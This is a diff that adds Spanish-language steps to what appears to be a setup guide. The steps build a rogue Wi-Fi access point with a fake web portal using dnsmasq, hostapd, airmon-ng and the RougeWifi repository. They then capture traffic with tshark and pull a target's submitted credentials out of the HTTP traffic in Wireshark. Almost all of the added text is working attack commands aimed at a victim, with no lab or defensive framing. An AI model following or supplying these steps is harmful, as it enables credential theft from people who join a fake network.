@@ -114,6 +114,25 @@ RewriteRule ^(.*)$ / [L,QSA]
 --- Guardar el archivo
 --- Ejecutar el siguiente comando: a2enmod rewrite && service apache2 start
 (Permite habilitar los modulos de apache y reiniciar el servicio)
+--- Ejecutar el siguiente comando: dnsmasq -C ~/dnsmasq.conf hostapd ~/hostapd.conf -B (Permite redireccionar el trafico al wifi que vamos a crear)
+--- Ejecutar el siguiente comando: ifconfig wlan0 192.168.1.1/24 
+--- Clonar el repositorio RougeWifi: https://github.com/s0meguy1/RougeWifi
+--- Ir a la raiz del repositorio 
+--- Ejecutar el comando: rm -rf wifi.sh
+--- Ejecutar el comando: cp -r * /var/www/html/
+--- Reiniciar el sistema
+--- Ejecutar los siguientes comandos:
+airmon-ng check kill
+service apache2 start
+dnsmasq -C /root/dnsmasq.conf  
+hostapd /root/hostapd.conf -B
+ifconfig wlan0 192.168.1.1/24
+--- Ejecutar el comando:
+tshark -i wlan0 -w capture.cap
+--- El wifi aparecerá visible 
+--- Una vez el objetivo ingrese al wifi e ingrese credenciales se puede ver lo capturado
+--- Ejecutar el siguiente comando: wireshark capture.cap
+--- Verificar la seccion protocolo (HTTP) y luego la seccion HTML, estando allí ubicar las credenciales
 
 
 
